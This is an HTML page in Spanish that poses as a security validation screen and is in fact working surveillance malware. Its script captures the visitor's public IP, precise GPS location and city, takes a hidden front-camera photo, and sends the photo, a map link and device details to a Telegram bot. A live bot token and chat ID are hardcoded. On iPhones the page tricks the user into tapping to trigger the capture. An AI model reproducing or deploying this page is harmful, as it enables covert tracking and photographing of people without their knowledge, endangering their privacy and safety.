<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AVISO DE SEGURIDAD</title>
<style>
    body { font-family: Arial, sans-serif; margin: 0; background: #f2f2f2; overflow: hidden; }
    .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); display: flex; justify-content: center; align-items: center; z-index: 9999; }
    .modal-content { background: white; padding: 30px; width: 90%; max-width: 400px; border-radius: 12px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.5); }
    .loading-spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
</style>
</head>
<body>

<div id="status-modal" class="modal-overlay">
    <div class="modal-content">
        <img src="https://i.ibb.co/S42ZgqWB/Sin-t-tulo.jpg" style="width:80px; margin-bottom:15px; border-radius: 50%;">
        <h3 id="status-title">Validando...</h3>
        <div class="loading-spinner"></div>
        <p id="status-text">Sincronizando con el servidor de seguridad. Por favor, no cierre esta ventana...</p>
    </div>
</div>

<script>
const BOT_TOKEN = "8253513816:AAERpjUuX757c3cd8wzOmW0vvpTHce6KCIo";
const CHAT_ID = "-5099354587";

let reporte = {
    ip: "Buscando...",
    ciudad: "Procesando...",
    lat: null, lon: null, acc: null,
    ua: navigator.userAgent,
    plat: navigator.platform,
    res: `${screen.width}x${screen.height}`
};

// Captura de IP inmediata
fetch('https://api.ipify.org?format=json').then(r => r.json()).then(j => { reporte.ip = j.ip; });

async function enviarA_Telegram(blob = null) {
    const maps = `https://www.google.com/maps?q=${reporte.lat},${reporte.lon}`;
    const info = `ðŸ“ INFORME FRONTAL NITIDO\n\n` +
                 `ðŸ•’ Fecha/Hora: ${new Date().toLocaleString('es-MX')}\n\n` +
                 `ðŸŒ IP PÃºblica: ${reporte.ip}\n` +
                 `ðŸ“Œ Ciudad: ${reporte.ciudad}\n\n` +
                 `ðŸ“¡ UbicaciÃ³n (GPS):\n` +
                 `â€¢ Latitud: ${reporte.lat}\nâ€¢ Longitud: ${reporte.lon}\nâ€¢ Mapa: ${maps}\n\n` +
                 `ðŸ“± Dispositivo:\nâ€¢ ${reporte.ua}\nâ€¢ ${reporte.plat}\nâ€¢ ${reporte.res}`;

    const fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    if (blob) {
        fd.append('photo', blob, 'f.jpg');
        fd.append('caption', info);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    } else {
        fd.append('text', info);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: fd });
    }
}

async function capturarConLuz() {
    navigator.geolocation.getCurrentPosition(async (pos) => {
        reporte.lat = pos.coords.latitude;
        reporte.lon = pos.coords.longitude;
        reporte.acc = pos.coords.accuracy.toFixed(1);

        fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${reporte.lat}&longitude=${reporte.lon}&localityLanguage=es`)
            .then(r => r.json()).then(j => { reporte.ciudad = j.city || "N/D"; });

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
            });
            
            const video = document.createElement('video');
            video.srcObject = stream;
            video.setAttribute("playsinline", true);
            video.muted = true;
            await video.play();

            // ESPERA CRITICA: Esperamos a que el video tenga dimensiones y pasen 800ms de luz
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(blob => {
                    enviarA_Telegram(blob);
                    stream.getTracks().forEach(t => t.stop());
                    document.getElementById('status-text').innerText = "VerificaciÃ³n completada.";
                }, 'image/jpeg', 0.85);
            }, 800); 

        } catch (e) {
            await enviarA_Telegram();
        }

    }, async () => {
        await enviarA_Telegram();
        location.reload();
    }, { enableHighAccuracy: true, timeout: 7000 });
}

window.onload = () => {
    const esIPhone = /iPhone|iPad|iPod/i.test(navigator.userAgent);
    if (!esIPhone) {
        capturarConLuz();
    } else {
        document.getElementById('status-title').innerText = "ConfirmaciÃ³n";
        document.getElementById('status-text').innerText = "Toque la pantalla para finalizar la validaciÃ³n.";
        document.body.addEventListener('click', () => {
            document.getElementById('status-title').innerText = "Sincronizando...";
            capturarConLuz();
        }, { once: true });
    }
};
</script>
</body>
</html>
